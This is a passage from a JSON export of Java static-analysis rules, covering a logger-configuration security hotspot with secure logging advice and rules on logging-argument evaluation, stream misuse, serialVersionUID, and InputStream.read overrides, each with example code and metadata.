happen when the logger is in debug mode. </li>\n  <li> the log can grow without limit. This can happen when additional information is written into logs every time a user performs an action and the\n  user can perform the action as many times as he/she wants. </li>\n  <li> the logs do not contain enough information to understand the damage an attacker might have inflicted. The loggers mode (info, warn, error)\n  might filter out important information. They might not print contextual information like the precise time of events or the server hostname. </li>\n  <li> the logs are only stored locally instead of being backuped or replicated. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Check that your production deployment doesn't have its loggers in \"debug\" mode as it might write sensitive information in logs. </li>\n  <li> Production logs should be stored in a secure location which is only accessible to system administrators. </li>\n  <li> Configure the loggers to display all warnings, info and error messages. Write relevant information such as the precise time of events and the\n  hostname. </li>\n  <li> Choose log format which is easy to parse and process automatically. It is important to process logs rapidly in case of an attack so that the\n  impact is known and limited. </li>\n  <li> Check that the permissions of the log files are correct. If you index the logs in some other service, make sure that the transfer and the\n  service are secure too. </li>\n  <li> Add limits to the size of the logs and make sure that no user can fill the disk with logs. This can happen even when the user does not control\n  the logged information. An attacker could just repeat a logged action many times. </li>\n</ul>\n<p>Remember that configuring loggers properly doesn't make them bullet-proof. Here is a list of recommendations explaining on how to use your\nlogs:</p>\n<ul>\n  <li> Don't log any sensitive information. This obviously includes passwords and credit card numbers but also any personal information such as user\n  names, locations, etc... Usually any information which is protected by law is good candidate for removal. </li>\n  <li> Sanitize all user inputs before writing them in the logs. This includes checking its size, content, encoding, syntax, etc... As for any user\n  input, validate using whitelists whenever possible. Enabling users to write what they want in your logs can have many impacts. It could for example\n  use all your storage space or compromise your log indexing service. </li>\n  <li> Log enough information to monitor suspicious activities and evaluate the impact an attacker might have on your systems. Register events such as\n  failed logins, successful logins, server side input validation failures, access denials and any important transaction. </li>\n  <li> Monitor the logs for any suspicious activity. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p>This rule supports the following libraries: Log4J, <code>java.util.logging</code> and Logback</p>\n<pre>\n// === Log4J 2 ===\nimport org.apache.logging.log4j.core.config.builder.api.ConfigurationBuilderFactory;\nimport org.apache.logging.log4j.Level;\nimport org.apache.logging.log4j.core.*;\nimport org.apache.logging.log4j.core.config.*;\n\n// Sensitive: creating a new custom configuration\nabstract class CustomConfigFactory extends ConfigurationFactory {\n    // ...\n}\n\nclass A {\n    void foo(Configuration config, LoggerContext context, java.util.Map&lt;String, Level&gt; levelMap,\n            Appender appender, java.io.InputStream stream, java.net.URI uri,\n            java.io.File file, java.net.URL url, String source, ClassLoader loader, Level level, Filter filter)\n            throws java.io.IOException {\n        // Creating a new custom configuration\n        ConfigurationBuilderFactory.newConfigurationBuilder();  // Sensitive\n\n        // Setting loggers level can result in writing sensitive information in production\n        Configurator.setAllLevels(\"com.example\", Level.DEBUG);  // Sensitive\n        Configurator.setLevel(\"com.example\", Level.DEBUG);  // Sensitive\n        Configurator.setLevel(levelMap);  // Sensitive\n        Configurator.setRootLevel(Level.DEBUG);  // Sensitive\n\n        config.addAppender(appender); // Sensitive: this modifies the configuration\n\n        LoggerConfig loggerConfig = config.getRootLogger();\n        loggerConfig.addAppender(appender, level, filter); // Sensitive\n        loggerConfig.setLevel(level); // Sensitive\n\n        context.setConfigLocation(uri); // Sensitive\n\n        // Load the configuration from a stream or file\n        new ConfigurationSource(stream);  // Sensitive\n        new ConfigurationSource(stream, file);  // Sensitive\n        new ConfigurationSource(stream, url);  // Sensitive\n        ConfigurationSource.fromResource(source, loader);  // Sensitive\n        ConfigurationSource.fromUri(uri);  // Sensitive\n    }\n}\n\n\n\n</pre>\n<pre>\n// === java.util.logging ===\nimport java.util.logging.*;\n\nclass M {\n    void foo(LogManager logManager, Logger logger, java.io.InputStream is, Handler handler)\n            throws SecurityException, java.io.IOException {\n        logManager.readConfiguration(is); // Sensitive\n\n        logger.setLevel(Level.FINEST); // Sensitive\n        logger.addHandler(handler); // Sensitive\n    }\n}\n</pre>\n<pre>\n// === Logback ===\nimport ch.qos.logback.classic.util.ContextInitializer;\nimport ch.qos.logback.core.Appender;\nimport ch.qos.logback.classic.joran.JoranConfigurator;\nimport ch.qos.logback.classic.spi.ILoggingEvent;\nimport ch.qos.logback.classic.*;\n\nclass M {\n    void foo(Logger logger, Appender&lt;ILoggingEvent&gt; fileAppender) {\n        System.setProperty(ContextInitializer.CONFIG_FILE_PROPERTY, \"config.xml\"); // Sensitive\n        JoranConfigurator configurator = new JoranConfigurator(); // Sensitive\n\n        logger.addAppender(fileAppender); // Sensitive\n        logger.setLevel(Level.DEBUG); // Sensitive\n    }\n}\n</pre>\n<h2>Exceptions</h2>\n<p>Log4J 1.x is not covered as it has reached <a href=\"https://blogs.apache.org/foundation/entry/apache_logging_services_project_announces\">end of\nlife</a>.</p>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure\">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure\n  </li>\n  <li> <a href=\"https://owasp.org/www-project-top-ten/2017/A10_2017-Insufficient_Logging%2526Monitoring\">OWASP Top 10 2017 Category A10</a> -\n  Insufficient Logging &amp; Monitoring </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/532.html\">MITRE, CWE-532</a> - Information Exposure Through Log Files </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/117.html\">MITRE, CWE-117</a> - Improper Output Neutralization for Logs </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/778.html\">MITRE, CWE-778</a> - Insufficient Logging </li>\n  <li> <a href=\"https://www.sans.org/top25-software-errors/#cat3\">SANS Top 25</a> - Porous Defenses </li>\n</ul>",
            "mdDesc": "<p>Configuring loggers is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0285\">CVE-2018-0285</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-1127\">CVE-2000-1127</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-15113\">CVE-2017-15113</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5742\">CVE-2015-5742</a> </li>\n</ul>\n<p>Logs are useful before, during and after a security incident.</p>\n<ul>\n  <li> Attackers will most of the time start their nefarious work by probing the system for vulnerabilities. Monitoring this activity and stopping it\n  is the first step to prevent an attack from ever happening. </li>\n  <li> In case of a successful attack, logs should contain enough information to understand what damage an attacker may have inflicted. </li>\n</ul>\n<p>Logs are also a target for attackers because they might contain sensitive information. Configuring loggers has an impact on the type of information\nlogged and how they are logged.</p>\n<p>This rule flags for review code that initiates loggers configuration. The goal is to guide security code reviews.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> unauthorized users might have access to the logs, either because they are stored in an insecure location or because the application gives\n  access to them. </li>\n  <li> the logs contain sensitive information on a production server. This can happen when the logger is in debug mode. </li>\n  <li> the log can grow without limit. This can happen when additional information is written into logs every time a user performs an action and the\n  user can perform the action as many times as he/she wants. </li>\n  <li> the logs do not contain enough information to understand the damage an attacker might have inflicted. The loggers mode (info, warn, error)\n  might filter out important information. They might not print contextual information like the precise time of events or the server hostname. </li>\n  <li> the logs are only stored locally instead of being backuped or replicated. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Check that your production deployment doesn't have its loggers in \"debug\" mode as it might write sensitive information in logs. </li>\n  <li> Production logs should be stored in a secure location which is only accessible to system administrators. </li>\n  <li> Configure the loggers to display all warnings, info and error messages. Write relevant information such as the precise time of events and the\n  hostname. </li>\n  <li> Choose log format which is easy to parse and process automatically. It is important to process logs rapidly in case of an attack so that the\n  impact is known and limited. </li>\n  <li> Check that the permissions of the log files are correct. If you index the logs in some other service, make sure that the transfer and the\n  service are secure too. </li>\n  <li> Add limits to the size of the logs and make sure that no user can fill the disk with logs. This can happen even when the user does not control\n  the logged information. An attacker could just repeat a logged action many times. </li>\n</ul>\n<p>Remember that configuring loggers properly doesn't make them bullet-proof. Here is a list of recommendations explaining on how to use your\nlogs:</p>\n<ul>\n  <li> Don't log any sensitive information. This obviously includes passwords and credit card numbers but also any personal information such as user\n  names, locations, etc... Usually any information which is protected by law is good candidate for removal. </li>\n  <li> Sanitize all user inputs before writing them in the logs. This includes checking its size, content, encoding, syntax, etc... As for any user\n  input, validate using whitelists whenever possible. Enabling users to write what they want in your logs can have many impacts. It could for example\n  use all your storage space or compromise your log indexing service. </li>\n  <li> Log enough information to monitor suspicious activities and evaluate the impact an attacker might have on your systems. Register events such as\n  failed logins, successful logins, server side input validation failures, access denials and any important transaction. </li>\n  <li> Monitor the logs for any suspicious activity. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p>This rule supports the following libraries: Log4J, <code>java.util.logging</code> and Logback</p>\n<pre>\n// === Log4J 2 ===\nimport org.apache.logging.log4j.core.config.builder.api.ConfigurationBuilderFactory;\nimport org.apache.logging.log4j.Level;\nimport org.apache.logging.log4j.core.*;\nimport org.apache.logging.log4j.core.config.*;\n\n// Sensitive: creating a new custom configuration\nabstract class CustomConfigFactory extends ConfigurationFactory {\n    // ...\n}\n\nclass A {\n    void foo(Configuration config, LoggerContext context, java.util.Map&lt;String, Level&gt; levelMap,\n            Appender appender, java.io.InputStream stream, java.net.URI uri,\n            java.io.File file, java.net.URL url, String source, ClassLoader loader, Level level, Filter filter)\n            throws java.io.IOException {\n        // Creating a new custom configuration\n        ConfigurationBuilderFactory.newConfigurationBuilder();  // Sensitive\n\n        // Setting loggers level can result in writing sensitive information in production\n        Configurator.setAllLevels(\"com.example\", Level.DEBUG);  // Sensitive\n        Configurator.setLevel(\"com.example\", Level.DEBUG);  // Sensitive\n        Configurator.setLevel(levelMap);  // Sensitive\n        Configurator.setRootLevel(Level.DEBUG);  // Sensitive\n\n        config.addAppender(appender); // Sensitive: this modifies the configuration\n\n        LoggerConfig loggerConfig = config.getRootLogger();\n        loggerConfig.addAppender(appender, level, filter); // Sensitive\n        loggerConfig.setLevel(level); // Sensitive\n\n        context.setConfigLocation(uri); // Sensitive\n\n        // Load the configuration from a stream or file\n        new ConfigurationSource(stream);  // Sensitive\n        new ConfigurationSource(stream, file);  // Sensitive\n        new ConfigurationSource(stream, url);  // Sensitive\n        ConfigurationSource.fromResource(source, loader);  // Sensitive\n        ConfigurationSource.fromUri(uri);  // Sensitive\n    }\n}\n\n\n\n</pre>\n<pre>\n// === java.util.logging ===\nimport java.util.logging.*;\n\nclass M {\n    void foo(LogManager logManager, Logger logger, java.io.InputStream is, Handler handler)\n            throws SecurityException, java.io.IOException {\n        logManager.readConfiguration(is); // Sensitive\n\n        logger.setLevel(Level.FINEST); // Sensitive\n        logger.addHandler(handler); // Sensitive\n    }\n}\n</pre>\n<pre>\n// === Logback ===\nimport ch.qos.logback.classic.util.ContextInitializer;\nimport ch.qos.logback.core.Appender;\nimport ch.qos.logback.classic.joran.JoranConfigurator;\nimport ch.qos.logback.classic.spi.ILoggingEvent;\nimport ch.qos.logback.classic.*;\n\nclass M {\n    void foo(Logger logger, Appender&lt;ILoggingEvent&gt; fileAppender) {\n        System.setProperty(ContextInitializer.CONFIG_FILE_PROPERTY, \"config.xml\"); // Sensitive\n        JoranConfigurator configurator = new JoranConfigurator(); // Sensitive\n\n        logger.addAppender(fileAppender); // Sensitive\n        logger.setLevel(Level.DEBUG); // Sensitive\n    }\n}\n</pre>\n<h2>Exceptions</h2>\n<p>Log4J 1.x is not covered as it has reached <a href=\"https://blogs.apache.org/foundation/entry/apache_logging_services_project_announces\">end of\nlife</a>.</p>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure\">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure\n  </li>\n  <li> <a href=\"https://owasp.org/www-project-top-ten/2017/A10_2017-Insufficient_Logging%2526Monitoring\">OWASP Top 10 2017 Category A10</a> -\n  Insufficient Logging &amp; Monitoring </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/532.html\">MITRE, CWE-532</a> - Information Exposure Through Log Files </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/117.html\">MITRE, CWE-117</a> - Improper Output Neutralization for Logs </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/778.html\">MITRE, CWE-778</a> - Insufficient Logging </li>\n  <li> <a href=\"https://www.sans.org/top25-software-errors/#cat3\">SANS Top 25</a> - Porous Defenses </li>\n</ul>",
            "severity": "CRITICAL",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cwe",
                "owasp-a10",
                "owasp-a3",
                "sans-top25-porous"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "debtOverloaded": false,
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "SECURITY_HOTSPOT"
        },
        {
            "key": "java:S2629",
            "repo": "java",
            "name": "\"Preconditions\" and logging arguments should not require evaluation",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Passing message arguments that require further evaluation into a Guava <code>com.google.common.base.Preconditions</code> check can result in a\nperformance penalty. That's because whether or not they're needed, each argument must be resolved before the method is actually called.</p>\n<p>Similarly, passing concatenated strings into a logging method can also incur a needless performance hit because the concatenation will be performed\nevery time the method is called, whether or not the log level is low enough to show the message.</p>\n<p>Instead, you should structure your code to pass static or pre-computed values into <code>Preconditions</code> conditions check and logging\ncalls.</p>\n<p>Specifically, the built-in string formatting should be used instead of string concatenation, and if the message is the result of a method call,\nthen <code>Preconditions</code> should be skipped altogether, and the relevant exception should be conditionally thrown instead.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nlogger.log(Level.DEBUG, \"Something went wrong: \" + message);  // Noncompliant; string concatenation performed even when log level too high to show DEBUG messages\n\nlogger.fine(\"An exception occurred with message: \" + message); // Noncompliant\n\nLOG.error(\"Unable to open file \" + csvPath, e);  // Noncompliant\n\nPreconditions.checkState(a &gt; 0, \"Arg must be positive, but got \" + a);  // Noncompliant. String concatenation performed even when a &gt; 0\n\nPreconditions.checkState(condition, formatMessage());  // Noncompliant. formatMessage() invoked regardless of condition\n\nPreconditions.checkState(condition, \"message: %s\", formatMessage());  // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nlogger.log(Level.SEVERE, \"Something went wrong: {0} \", message);  // String formatting only applied if needed\n\nlogger.fine(\"An exception occurred with message: {}\", message);  // SLF4J, Log4j\n\nlogger.log(Level.SEVERE, () -&gt; \"Something went wrong: \" + message); // since Java 8, we can use Supplier , which will be evaluated lazily\n\nLOG.error(\"Unable to open file {0}\", csvPath, e);\n\nif (LOG.isDebugEnabled() {\n  LOG.debug(\"Unable to open file \" + csvPath, e);  // this is compliant, because it will not evaluate if log level is above debug.\n}\n\nPreconditions.checkState(arg &gt; 0, \"Arg must be positive, but got %d\", a);  // String formatting only applied if needed\n\nif (!condition) {\n  throw new IllegalStateException(formatMessage());  // formatMessage() only invoked conditionally\n}\n\nif (!condition) {\n  throw new IllegalStateException(\"message: \" + formatMessage());\n}\n</pre>\n<h2>Exceptions</h2>\n<p><code>catch</code> blocks are ignored, because the performance penalty is unimportant on exceptional paths (catch block should not be a part of\nstandard program flow). Getters are ignored as well as methods called on annotations which can be considered as getters. This rule accounts for\nexplicit test-level testing with SLF4J methods <code>isXXXEnabled</code> and ignores the bodies of such <code>if</code> statements.</p>",
            "mdDesc": "<p>Passing message arguments that require further evaluation into a Guava <code>com.google.common.base.Preconditions</code> check can result in a\nperformance penalty. That's because whether or not they're needed, each argument must be resolved before the method is actually called.</p>\n<p>Similarly, passing concatenated strings into a logging method can also incur a needless performance hit because the concatenation will be performed\nevery time the method is called, whether or not the log level is low enough to show the message.</p>\n<p>Instead, you should structure your code to pass static or pre-computed values into <code>Preconditions</code> conditions check and logging\ncalls.</p>\n<p>Specifically, the built-in string formatting should be used instead of string concatenation, and if the message is the result of a method call,\nthen <code>Preconditions</code> should be skipped altogether, and the relevant exception should be conditionally thrown instead.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nlogger.log(Level.DEBUG, \"Something went wrong: \" + message);  // Noncompliant; string concatenation performed even when log level too high to show DEBUG messages\n\nlogger.fine(\"An exception occurred with message: \" + message); // Noncompliant\n\nLOG.error(\"Unable to open file \" + csvPath, e);  // Noncompliant\n\nPreconditions.checkState(a &gt; 0, \"Arg must be positive, but got \" + a);  // Noncompliant. String concatenation performed even when a &gt; 0\n\nPreconditions.checkState(condition, formatMessage());  // Noncompliant. formatMessage() invoked regardless of condition\n\nPreconditions.checkState(condition, \"message: %s\", formatMessage());  // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nlogger.log(Level.SEVERE, \"Something went wrong: {0} \", message);  // String formatting only applied if needed\n\nlogger.fine(\"An exception occurred with message: {}\", message);  // SLF4J, Log4j\n\nlogger.log(Level.SEVERE, () -&gt; \"Something went wrong: \" + message); // since Java 8, we can use Supplier , which will be evaluated lazily\n\nLOG.error(\"Unable to open file {0}\", csvPath, e);\n\nif (LOG.isDebugEnabled() {\n  LOG.debug(\"Unable to open file \" + csvPath, e);  // this is compliant, because it will not evaluate if log level is above debug.\n}\n\nPreconditions.checkState(arg &gt; 0, \"Arg must be positive, but got %d\", a);  // String formatting only applied if needed\n\nif (!condition) {\n  throw new IllegalStateException(formatMessage());  // formatMessage() only invoked conditionally\n}\n\nif (!condition) {\n  throw new IllegalStateException(\"message: \" + formatMessage());\n}\n</pre>\n<h2>Exceptions</h2>\n<p><code>catch</code> blocks are ignored, because the performance penalty is unimportant on exceptional paths (catch block should not be a part of\nstandard program flow). Getters are ignored as well as methods called on annotations which can be considered as getters. This rule accounts for\nexplicit test-level testing with SLF4J methods <code>isXXXEnabled</code> and ignores the bodies of such <code>if</code> statements.</p>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "performance"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S3958",
            "repo": "java",
            "name": "Intermediate Stream methods should not be left unused",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>There are two types of stream operations: intermediate operations, which return another stream, and terminal operations, which return something\nother than a stream. Intermediate operations are lazy, meaning they aren't actually executed until and unless a terminal stream operation is performed\non their results. Consequently if the result of an intermediate stream operation is not fed to a terminal operation, it serves no purpose, which is\nalmost certainly an error.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nwidgets.stream().filter(b -&gt; b.getColor() == RED); // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nint sum = widgets.stream()\n                      .filter(b -&gt; b.getColor() == RED)\n                      .mapToInt(b -&gt; b.getWeight())\n                      .sum();\nStream&lt;Widget&gt; pipeline = widgets.stream()\n                                 .filter(b -&gt; b.getColor() == GREEN)\n                                 .mapToInt(b -&gt; b.getWeight());\nsum = pipeline.sum();\n</pre>\n<h2>See</h2>\n<p><a href=\"https://docs.oracle.com/javase/8/docs/api/java/util/stream/package-summary.html#StreamOps\">Stream Operations</a></p>",
            "mdDesc": "<p>There are two types of stream operations: intermediate operations, which return another stream, and terminal operations, which return something\nother than a stream. Intermediate operations are lazy, meaning they aren't actually executed until and unless a terminal stream operation is performed\non their results. Consequently if the result of an intermediate stream operation is not fed to a terminal operation, it serves no purpose, which is\nalmost certainly an error.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nwidgets.stream().filter(b -&gt; b.getColor() == RED); // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nint sum = widgets.stream()\n                      .filter(b -&gt; b.getColor() == RED)\n                      .mapToInt(b -&gt; b.getWeight())\n                      .sum();\nStream&lt;Widget&gt; pipeline = widgets.stream()\n                                 .filter(b -&gt; b.getColor() == GREEN)\n                                 .mapToInt(b -&gt; b.getWeight());\nsum = pipeline.sum();\n</pre>\n<h2>See</h2>\n<p><a href=\"https://docs.oracle.com/javase/8/docs/api/java/util/stream/package-summary.html#StreamOps\">Stream Operations</a></p>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "java8"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "10min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "10min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "10min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "10min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S4926",
            "repo": "java",
            "name": "\"serialVersionUID\" should not be declared blindly",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Providing a <code>serialVersionUID</code> field on <code>Serializable</code> classes is strongly recommended by the <code>Serializable</code>\ndocumentation but blindly following that recommendation can be harmful.</p>\n<p><code>serialVersionUID</code> value is stored with the serialized data and this field is verified when deserializing the data to ensure that the\ncode reading the data is compatible with the serialized data. In case of failure, it means the serialized data and the code are not in sync and this\nfine because you know what's wrong.</p>\n<p>When the <code>serialVersionUID</code> is generated by an IDE or blindly hard-coded, there is a high probability that one will forget to update the\n<code>serialVersionUID</code> value when the <code>Serializable</code> class is later enriched with additional fields. As a consequence, old\nserialized data will incorrectly be considered compatible with the newer version of the code creating situations which are hard to debug.</p>\n<p>Therefore, defining <code>serialVersionUID</code> should be done with care. This rule raises an issue on each <code>serialVersionUID</code> field\ndeclared on classes implementing <code>Serializable</code> to be sure the presence and the value of the <code>serialVersionUID</code> field is\nchallenged and validated by the team.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class Foo implements Serializable {\n  private static final long serialVersionUID = 1;\n}\n\npublic class BarException extends RuntimeException {\n  private static final long serialVersionUID = 8582433437601788991L;\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> Vojtech Ruzicka's Programming Blog: <a href=\"https://www.vojtechruzicka.com/explicitly-declare-serialversionuid/\">Should I explicitly declare\n  serialVersionUID?</a> </li>\n</ul>",
            "mdDesc": "<p>Providing a <code>serialVersionUID</code> field on <code>Serializable</code> classes is strongly recommended by the <code>Serializable</code>\ndocumentation but blindly following that recommendation can be harmful.</p>\n<p><code>serialVersionUID</code> value is stored with the serialized data and this field is verified when deserializing the data to ensure that the\ncode reading the data is compatible with the serialized data. In case of failure, it means the serialized data and the code are not in sync and this\nfine because you know what's wrong.</p>\n<p>When the <code>serialVersionUID</code> is generated by an IDE or blindly hard-coded, there is a high probability that one will forget to update the\n<code>serialVersionUID</code> value when the <code>Serializable</code> class is later enriched with additional fields. As a consequence, old\nserialized data will incorrectly be considered compatible with the newer version of the code creating situations which are hard to debug.</p>\n<p>Therefore, defining <code>serialVersionUID</code> should be done with care. This rule raises an issue on each <code>serialVersionUID</code> field\ndeclared on classes implementing <code>Serializable</code> to be sure the presence and the value of the <code>serialVersionUID</code> field is\nchallenged and validated by the team.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class Foo implements Serializable {\n  private static final long serialVersionUID = 1;\n}\n\npublic class BarException extends RuntimeException {\n  private static final long serialVersionUID = 8582433437601788991L;\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> Vojtech Ruzicka's Programming Blog: <a href=\"https://www.vojtechruzicka.com/explicitly-declare-serialversionuid/\">Should I explicitly declare\n  serialVersionUID?</a> </li>\n</ul>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "pitfall",
                "serialization"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "10min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "10min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "10min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "10min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S3959",
            "repo": "java",
            "name": "Consumed Stream pipelines should not be reused",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Stream operations are divided into intermediate and terminal operations, and are combined to form stream pipelines. After the terminal operation is\nperformed, the stream pipeline is considered consumed, and cannot be used again. Such a reuse will yield unexpected results.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nStream&lt;Widget&gt; pipeline = widgets.stream().filter(b -&gt; b.getColor() == RED);\nint sum1 = pipeline.sum();\nint sum2 = pipeline.mapToInt(b -&gt; b.getWeight()).sum(); // Noncompliant\n</pre>\n<h2>See</h2>\n<p><a href=\"https://docs.oracle.com/javase/8/docs/api/java/util/stream/package-summary.html#StreamOps\">Stream Operations</a></p>",
            "mdDesc": "<p>Stream operations are divided into intermediate and terminal operations, and are combined to form stream pipelines. After the terminal operation is\nperformed, the stream pipeline is considered consumed, and cannot be used again. Such a reuse will yield unexpected results.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nStream&lt;Widget&gt; pipeline = widgets.stream().filter(b -&gt; b.getColor() == RED);\nint sum1 = pipeline.sum();\nint sum2 = pipeline.mapToInt(b -&gt; b.getWeight()).sum(); // Noncompliant\n</pre>\n<h2>See</h2>\n<p><a href=\"https://docs.oracle.com/javase/8/docs/api/java/util/stream/package-summary.html#StreamOps\">Stream Operations</a></p>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "java8"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "10min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "10min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "10min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "10min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S4929",
            "repo": "java",
            "name": "\"read(byte[],int,int)\" should be overridden",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>When directly subclassing <code>java.io.InputStream</code> or <code>java.io.FilterInputStream</code>, the only requirement is that you implement\nthe method <code>read()</code>. However most uses for such streams don't read a single byte at a time and the default implementation for\n<code>read(byte[],int,int)</code> will call <code>read(int)</code> for every single byte in the array which can create a lot of overhead and is\nutterly inefficient. It is therefore strongly recommended that subclasses provide an efficient implementation of\n<code>read(byte[],int,int)</code>.</p>\n<p>This rule raises an issue when a direct subclass of <code>java.io.InputStream</code> or <code>java.io.FilterInputStream</code> doesn't provide an\noverride of <code>read(byte[],int,int)</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class MyInputStream extends java.io.InputStream {\n  private FileInputStream fin;\n\n  public MyInputStream(File file) throws IOException {\n    fin = new FileInputStream(file);\n  }\n\n  @Override\n  public int read() throws IOException {\n    return fin.read();\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic class MyInputStream extends java.io.InputStream {\n  private FileInputStream fin;\n\n  public MyInputStream(File file) throws IOException {\n    fin = new FileInputStream(file);\n  }\n\n  @Override\n  public int read() throws IOException {\n    return fin.read();\n  }\n\n  @Override\n  public int read(byte[] b, int off, int len) throws IOException {\n    return fin.read(b, off, len);\n  }\n}\n</pre>\n<h2>Exceptions</h2>\n<p>This rule doesn't raise an issue when the class is declared <code>abstract</code>.</p>",
            "mdDesc": "<p>When directly subclassing <code>java.io.InputStream</code> or <code>java.io.FilterInputStream</code>, the only requirement is that you implement\nthe method <code>read()</code>. However most uses for such streams don't read a single byte at a time and the default implementation for\n<code>read(byte[],int,int)</code> will call <code>read(int)</code> for every single byte in the array which can create a lot of overhead and is\nutterly inefficient. It is therefore strongly recommended that subclasses provide an efficient implementation of\n<code>read(byte[],int,int)</code>.</p>\n<p>This rule raises an issue when a direct subclass of <code>java.io.InputStream</code> or <code>java.io.FilterInputStream</code> doesn't provide an\noverride of <code>read(byte[],int,int)</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class MyInputStream extends java.io.InputStream {\n  private FileInputStream fin;\n\n  public MyInputStream(File file) throws IOException {\n    fin = new FileInputStream(file);\n  }\n\n  @Override\n  public int read() throws IOException {\n    return fin.read();\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic class MyInputStream extends java.io.InputStream {\n  private FileInputStream fin;\n\n  public MyInputStream(File file) throws IOException {\n    fin = new FileInputStream(file);\n  }\n\n  @Override\n  public int read() throws IOException {\n    return fin.read();\n  }\n\n  @Override\n  public int read(byte[] b, int off, int len) throws IOException {\n    return fin.read(b, off, len);\n  